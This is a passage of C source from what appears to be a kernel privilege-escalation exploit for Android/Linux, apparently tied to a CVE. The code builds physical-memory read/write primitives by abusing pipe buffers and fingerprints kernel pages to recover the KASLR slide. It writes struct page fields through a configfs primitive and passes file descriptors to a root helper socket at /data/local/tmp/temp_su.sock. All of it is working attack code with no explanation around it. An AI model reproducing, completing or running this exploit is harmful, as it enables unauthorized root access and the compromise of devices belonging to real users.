            (unsigned long long)pipe_scan_q3,
            (unsigned long long)pipe_scan_first_page,
            (unsigned long long)pipe_scan_first_ops,
            pipe_scan_first_len, pipe_scan_first_flags);
  }
  if (!found) {
    return 0;
  }
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
          physrw_read_ok, pipebuf_pipe_idx);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  kernel_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));

  uintptr_t proof64_addr = proof_addr + 0x100;
  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64));
  physrw_read64_before = pipe_read64(fd, proof64_addr);
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  kernel_read_data(
      fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  return physrw_read_ok &&
         memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
         physrw_write_ok &&
         memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
         physrw_read64_ok && physrw_write64_ok;
}

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int pipe_write_full(int fd, const void *data, size_t size) {
  const unsigned char *cursor = data;
  while (size) {
    ssize_t wrote = write(fd, cursor, size);
    if (wrote <= 0) {
      return 0;
    }
    cursor += wrote;
    size -= (size_t)wrote;
  }
  return 1;
}

static int pipe_read_full(int fd, void *data, size_t size) {
  unsigned char *cursor = data;
  while (size) {
    ssize_t got = read(fd, cursor, size);
    if (got <= 0) {
      return 0;
    }
    cursor += got;
    size -= (size_t)got;
  }
  return 1;
}

static int pipe_duplicate_bytes(
    int source_fd, int holder[2], size_t size, size_t slots) {
  SYSCHK(pipe(holder));
  resize_pipe_slots(holder, slots);
  errno = 0;
  ssize_t duplicated = syscall(SYS_tee, source_fd, holder[1], size, 0);
  return duplicated == (ssize_t)size;
}

static int transfer_p0_references_to_root(int retained_pipe_index) {
  int retained_fds[] = {
    pipe_fds_reclaim[retained_pipe_index][0],
    p0_gate_holders[retained_pipe_index][0],
    reclaim_receiver_fd(),
  };
  for (size_t index = 0;
       index < sizeof(retained_fds) / sizeof(retained_fds[0]); index++) {
    if (retained_fds[index] < 0) {
      return 0;
    }
  }

  int socket_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (socket_fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  snprintf(address.sun_path, sizeof(address.sun_path), "%s",
           "/data/local/tmp/temp_su.sock");
  if (connect(socket_fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
    close(socket_fd);
    return 0;
  }

  char allowed = 0;
  char operation = 'H';
  if (!pipe_read_full(socket_fd, &allowed, sizeof(allowed)) || allowed != 'A' ||
      !pipe_write_full(socket_fd, &operation, sizeof(operation))) {
    close(socket_fd);
    return 0;
  }

  char marker = 'P';
  struct iovec iov = {
    .iov_base = &marker,
    .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(retained_fds))];
  struct msghdr message;
  memset(&message, 0, sizeof(message));
  memset(control, 0, sizeof(control));
  message.msg_iov = &iov;
  message.msg_iovlen = 1;
  message.msg_control = control;
  message.msg_controllen = sizeof(control);
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&message);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(retained_fds));
  memcpy(CMSG_DATA(cmsg), retained_fds, sizeof(retained_fds));
  if (sendmsg(socket_fd, &message, 0) != (ssize_t)sizeof(marker)) {
    close(socket_fd);
    return 0;
  }

  char acknowledged = 0;
  int transferred = pipe_read_full(
      socket_fd, &acknowledged, sizeof(acknowledged)) && acknowledged == 'K';
  close(socket_fd);
  return transferred;
}

static void spawn_p0_ref_keeper(int retained_pipe_index) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    pr_info("p0 reference keeper pid=%d pipe=%d\n",
            child, retained_pipe_index);
    return;
  }
  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-p0ref", 0, 0, 0);
  syscall(SYS_setsid);
  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (fd != null_fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  }
  if (retained_pipe_index >= 0) {
    for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
      if ((int)pipe_index != retained_pipe_index) {
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][0]);
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
        syscall(SYS_close, p0_gate_holders[pipe_index][0]);
        syscall(SYS_close, p0_gate_holders[pipe_index][1]);
        continue;
      }
      syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
      syscall(SYS_close, p0_gate_holders[pipe_index][1]);
    }
  }
  if (retained_pipe_index < 0) {
    for (;;) {
      pause();
    }
  }
  for (;;) {
    if (transfer_p0_references_to_root(retained_pipe_index)) {
      _exit(0);
    }
    usleep(10000);
  }
}

int prepare_p0_pipe_oracle(void) {
  _Static_assert(sizeof(struct user_pipe_buffer) == 0x28,
                 "unexpected pipe_buffer size");

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    p0_gate_holders[pipe_index][0] = -1;
    p0_gate_holders[pipe_index][1] = -1;
  }
  p0_gate_holders_initialized = 1;

  pipebuf_page_base = prepare_pipe_buffer_page();
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                         sizeof(marker))) {
      return 0;
    }
  }
  pr_info("p0 pipe oracle prepared base=%016zx pipes=%d gate_slots=1\n",
          pipebuf_page_base, PIPE_RECLAIM);
  return 1;
}

int expand_p0_pipe_oracle(void) {
  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    for (size_t slot = 1; slot < PIPE_BUFFER_SLOTS; slot++) {
      if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                           sizeof(marker))) {
        return 0;
      }
    }
  }
  pr_info("p0 pipe oracle expanded pipes=%d slots=%d\n",
          PIPE_RECLAIM, PIPE_BUFFER_SLOTS);
  return 1;
}

int verify_p0_pipe_oracle_gate(void) {
  unsigned char page[PAGE_SIZE];
  int gate_hits = 0;
  int gate_pipe_index = -1;
  int changed_pages = 0;
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
                              p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
      pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      spawn_p0_ref_keeper(-1);
      return 0;
    }
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        sizeof(page))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
    size_t gate_offset = PAGE_SIZE;
    for (size_t offset = 0; offset + 18 <= PAGE_SIZE; offset++) {
      if (memcmp(page + offset, "RMG-P0-ORACLE-GATE", 18) == 0) {
        gate_offset = offset;
        break;
      }
    }
    if (gate_offset != PAGE_SIZE) {
      gate_hits++;
      gate_pipe_index = (int)pipe_index;
      pr_info("p0 gate marker pipe=%zu offset=%zu\n",
              pipe_index, gate_offset);
    } else if (memcmp(page, "RMG-P0-PIPE", 11) != 0) {
      changed_pages++;
      uint64_t words[8];
      memcpy(words, page, sizeof(words));
      pr_info("p0 gate changed pipe=%zu q0=%016llx q1=%016llx "
              "q2=%016llx q3=%016llx q4=%016llx q5=%016llx "
              "q6=%016llx q7=%016llx\n",
              pipe_index,
              (unsigned long long)words[0],
              (unsigned long long)words[1],
              (unsigned long long)words[2],
              (unsigned long long)words[3],
              (unsigned long long)words[4],
              (unsigned long long)words[5],
              (unsigned long long)words[6],
              (unsigned long long)words[7]);
    }
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                         sizeof(marker))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
  }
  pr_info("p0 pipe gate hits=%d changed=%d\n",
          gate_hits, changed_pages);
  if (gate_hits != 0 || changed_pages != 0) {
    spawn_p0_ref_keeper(
        gate_hits == 1 && changed_pages == 0 ? gate_pipe_index : -1);
  }
  if (gate_hits == 1 && changed_pages == 0) {
    return 1;
  }
  if (gate_hits == 0 && changed_pages == 0) {
    return 0;
  }
  return -1;
}

static int p0_fingerprint_score(
    const unsigned char *page, const struct p0_fingerprint *fingerprint) {
  int score = 0;
  for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
    uint64_t value = 0;
    memcpy(&value, page + p0_fingerprint_offsets[index], sizeof(value));
    if (value == fingerprint->words[index]) {
      score++;
    }
  }
  return score;
}

uintptr_t scan_p0_pipe_oracle(void) {
  unsigned char page[PAGE_SIZE];
  size_t scan_size =
      p0_fingerprint_offsets[P0_FINGERPRINT_WORDS - 1] + sizeof(uint64_t);
  uintptr_t best_slide = (uintptr_t)-1;
  int best_score = -1;
  int second_score = -1;
  int changed_pages = 0;

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    memset(page, 0, sizeof(page));
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        scan_size)) {
      pr_warning("p0 scan partial read failed pipe=%zu size=%zu errno=%d\n",
                 pipe_index, scan_size, errno);
      return (uintptr_t)-1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }

    changed_pages++;
    uint64_t sampled_words[P0_FINGERPRINT_WORDS];
    for (size_t word = 0; word < P0_FINGERPRINT_WORDS; word++) {
      memcpy(&sampled_words[word], page + p0_fingerprint_offsets[word],
             sizeof(sampled_words[word]));
    }
    pr_info("p0 fingerprint sample "
            "w0=%016llx w1=%016llx w2=%016llx w3=%016llx "
            "w4=%016llx w5=%016llx w6=%016llx w7=%016llx\n",
            (unsigned long long)sampled_words[0],
            (unsigned long long)sampled_words[1],
            (unsigned long long)sampled_words[2],
            (unsigned long long)sampled_words[3],
            (unsigned long long)sampled_words[4],
            (unsigned long long)sampled_words[5],
            (unsigned long long)sampled_words[6],
            (unsigned long long)sampled_words[7]);
    for (size_t index = 0;
         index < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
         index++) {
      int score = p0_fingerprint_score(page, &p0_fingerprints[index]);
      if (score > best_score) {
        second_score = best_score;
        best_score = score;
        best_slide = p0_fingerprints[index].slide;
      } else if (score > second_score) {
        second_score = score;
      }
    }
    pr_info("p0 fingerprint pipe=%zu best=%d second=%d slide=%08zx\n",
            pipe_index, best_score, second_score, best_slide);
  }

  pr_info("p0 fingerprint changed=%d best=%d second=%d slide=%08zx\n",
          changed_pages, best_score, second_score, best_slide);
  if (changed_pages != 1 || best_score < 2 || best_score <= second_score) {
    return (uintptr_t)-1;
  }
  return best_slide;
}

int restore_p0_oracle_pages(int fd) {
  if (!p0_gate_page_struct && !p0_probe_page_struct) {
    return 1;
  }
  if (!p0_gate_page_struct || !p0_probe_page_struct) {
    return 0;
  }
  uintptr_t pages[] = {
    p0_gate_page_struct,
    p0_probe_page_struct,
  };
  uint64_t zero = 0;
  int restored = 1;

  for (size_t index = 0; index < sizeof(pages) / sizeof(pages[0]); index++) {
    uintptr_t compound_head = pages[index] + STRUCT_PAGE_COMPOUND_HEAD_OFF;
    uint64_t before = 0;
    uint64_t after = UINT64_MAX;
    ssize_t read_before = configfs_read_once(
        fd, compound_head, &before, sizeof(before));
    ssize_t write_ret = configfs_write_once(
        fd, compound_head, &zero, sizeof(zero));
    ssize_t read_after = configfs_read_once(
        fd, compound_head, &after, sizeof(after));
    pr_info("p0 restore page=%016zx read=%zd write=%zd verify=%zd "
            "before=%016llx after=%016llx\n",
            pages[index], read_before, write_ret, read_after,
            (unsigned long long)before, (unsigned long long)after);
    if (read_before != (ssize_t)sizeof(before) ||
        write_ret != (ssize_t)sizeof(zero) ||
        read_after != (ssize_t)sizeof(after) || after != 0) {
      restored = 0;
    }
  }
  return restored;
}
#endif
